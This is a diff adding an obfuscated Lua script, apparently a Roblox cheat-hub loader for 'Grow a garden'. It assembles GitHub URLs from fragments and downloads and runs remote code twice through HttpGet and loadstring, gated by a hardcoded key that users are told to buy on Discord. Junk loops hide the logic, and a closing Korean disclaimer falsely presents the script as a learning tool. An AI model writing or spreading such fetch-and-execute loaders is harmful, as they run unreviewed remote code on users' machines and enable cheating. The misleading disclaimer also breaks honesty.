@@ -1,0 +1,97 @@
+return (function(...)
+    local sel, args, loader = select, {...}, loadstring
+    local gObj = game
+    local getReq = gObj.HttpGet
+    local dummyVar1, dummyVar2, dummyVar3 = nil, 0, "start"
+    local function wasteTimeFunc(x, y)
+        local z = {}
+        for i = 1, (y or 1) do
+            z[#z + 1] = tostring(x) .. tostring(i)
+        end
+        return table.concat(z, "")
+    end
+    local function randomJoin(tbl)
+        local out = ""
+        for i = 1, #tbl do
+            out = out .. tbl[i]
+        end
+        return out
+    end
+    local u1 = {"https://raw.githubusercontent.com/", "OopssSorry/", "LuaU-Free-Key-System-UI/", "main/source.lua"}
+    local url1 = randomJoin(u1)
+    local KeySystem = loader(getReq(gObj, url1))()
+    local keyCheckFlag = false
+    local msgParts = {"Please", " purchase", " a", " key", " on", " Discord"}
+    local function joinMsg(parts)
+        local out = ""
+        for i = 1, #parts do
+            out = out .. parts[i]
+        end
+        return out
+    end
+    local descMsg = joinMsg(msgParts)
+    local kParts = {"X9", "QW7", "ZP3L", "MR82TJC", "KFA6N", "VGBY", "S4H", "EDUQ"}
+    local function concatKey(tbl)
+        local temp = {}
+        for _, v in ipairs(tbl) do
+            table.insert(temp, v)
+        end
+        return table.concat(temp)
+    end
+    local realKey = concatKey(kParts)
+    local unusedCalc = wasteTimeFunc("A", 5)
+    local initResponse = KeySystem:Init({
+        Debug = false,
+        Title = "DenisterHub | Grow a garden",
+        Description = descMsg,
+        Discord = "https://discord.gg/" .. "MkKj5HBPjH",
+        SaveKey = false,
+        Verify = function(k)
+            local function compare(a, b)
+                local checkSum = tostring(#a) .. tostring(#b)
+                if checkSum == tostring(#realKey * 2) or a == b then
+                    return a == b
+                end
+                return false
+            end
+            if compare(k, realKey) then
+                keyCheckFlag = true
+                return true
+            end
+            return false
+        end,
+        GuiParent = gObj.CoreGui
+    })
+    local function dummyLoop(n)
+        for i = 1, n do
+            local _ = tostring(i) .. tostring(i * 2)
+        end
+    end
+    dummyLoop(10)
+    local function check(r, v)
+        return r and v
+    end
+    if not check(initResponse, keyCheckFlag) then return end
+    local u2 = {
+        "https://raw.githubusercontent.com/",
+        "MoziIOnTop/",
+        "MoziIHub/",
+        "refs/heads/main/",
+        "GrowaGarden"
+    }
+    local url2 = randomJoin(u2)
+    local function passthrough(x)
+        local tmp = x
+        return tmp
+    end
+    local moreWaste = {1,2,3,4,5}
+    for _, num in ipairs(moreWaste) do
+        dummyVar3 = dummyVar3 .. tostring(num)
+    end
+    passthrough(loader(getReq(gObj, url2)))()
+end)(...)
+--[[
+    이 스크립트는 맵 제작 및 학습 목적을 위한 도구입니다.
+    불법적 사용(핵 제작, 게임 조작 등)에 대해서는 엄격히 금지하며,
+    사용으로 발생하는 모든 문제에 대해 제작자는 책임을 지지 않습니다.
+]]
